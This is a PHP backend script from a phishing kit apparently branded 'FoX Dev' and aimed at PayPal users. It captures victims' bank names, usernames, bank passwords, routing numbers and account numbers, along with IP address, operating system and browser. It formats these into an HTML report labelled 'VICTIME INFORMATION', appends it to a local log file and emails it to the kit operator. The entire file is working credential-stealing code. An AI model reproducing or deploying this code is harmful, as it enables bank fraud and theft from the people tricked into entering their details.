<?php

session_start();




include("system.php");




$_SESSION['_namebank_'] = $_POST['namebank'];
$_SESSION['_UserNameID_'] = $_POST['UserNameID'];
$_SESSION['_PasswordBank_'] = $_POST['PasswordBank'];
$_SESSION['_xxnxx_'] = $_POST['xxnxx'];
$_SESSION['_xxllxx_']  = $_POST['xxllxx'];




$InfoDATE   = date("d-m-Y h:i:sa");

$OS =getOS($_SERVER['HTTP_USER_AGENT']); 

$UserAgent =$_SERVER['HTTP_USER_AGENT'];
$browser = explode(')',$UserAgent);				
$_SESSION['browser'] = $browserTy_Version =array_pop($browser); 	






$time = date('d/m/Y G:i:s');

$ip = getenv("REMOTE_ADDR");


$marshall_email .= "<html>
<head><meta charset=\"UTF-8\"></head>
<div style='font-size: 13px;font-family:monospace;font-weight:700;border-style: solid;border-color: coral;width: 510px;background: url();background-repeat: no-repeat;background-position: center;'>
●•۰۰۰•●<font style='color: #9009A5;border-color:#ff9900;'>FoX Dev</font>●•۰۰۰۰•●<br/>
±±±±±±±±±±[ <font style='color: #FF358B;'>BANK INFORMATION</font> ]±±±±±±±±±±<br>
<font style='color:#9c0000;'>🚩</font> COUNTRY = </font> <font style='color:#010101;'>".$_SESSION."</font><br>
<font style='color:#9c0000;'>🕘</font> DATE Rezult = <font style='color:#0070ba;'>".$InfoDATE."</font><br>
<font style='color:#9c0000;'>🏦</font> Bank Name = <font style='color:#0070ba;'>".$_SESSION['_namebank_']."</font><br>
<font style='color:#9c0000;'>👨</font> User Name = <font style='color:#0070ba;'>".$_SESSION['_UserNameID_']."</font><br>
<font style='color:#9c0000;'>🔒</font> Password Bank = <font style='color:#0070ba;'>".$_SESSION['_PasswordBank_']."</font><br>
<font style='color:#9c0000;'>🔒</font> Routing Number = <font style='color:#0070ba;'>".$_SESSION['_xxnxx_']."</font><br>
<font style='color:#9c0000;'>🔒</font> Account Number = <font style='color:#0070ba;'>".$_SESSION['_xxllxx_']."</font><br>
±±±±±±±±±±[ <font style='color: #FF358B;'>VICTIME INFORMATION</font> ]±±±±±±±±±±<br>
<font style='color:#9c0000;'>🗺</font> IP INFO = <font style='color:#0070ba;'>https://geoiptool.com/en/?ip=".$_SERVER['REMOTE_ADDR']."</font><br>
<font style='color:#9c0000;'>💻</font> SYS = <font style='color:#0070ba;'>".$OS."</font><br>
<font style='color:#9c0000;'>🌀</font> BROWSER = <font style='color:#0070ba;'>".$browserTy_Version."</font><br>
<font style='color:#9c0000;'>🍁</font> ADRESS IP = <font style='color:#0070ba;'>".$_SERVER['REMOTE_ADDR']."</font><br>
●•۰۰۰•●<font style='color: #9009A5;border-color:#ff9900;'>FoX Dev</font>●•۰۰۰۰•●<br/>
</div></html>";   
include("sand_email.php");
$f = fopen("../../FoxDev.html", "a");
fwrite($f, $marshall_email);
$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
$subject  = "Bank PayPal [".$_SERVER['REMOTE_ADDR']." / ".$_SESSION['country1']." ] ";
$headers .= "From:◙[•♥•FoX Dev 5•♥•]◙ <dev@fox.com>" . "\r\n";
mail($yourmail, $subject, $marshall_email , $headers);




?>
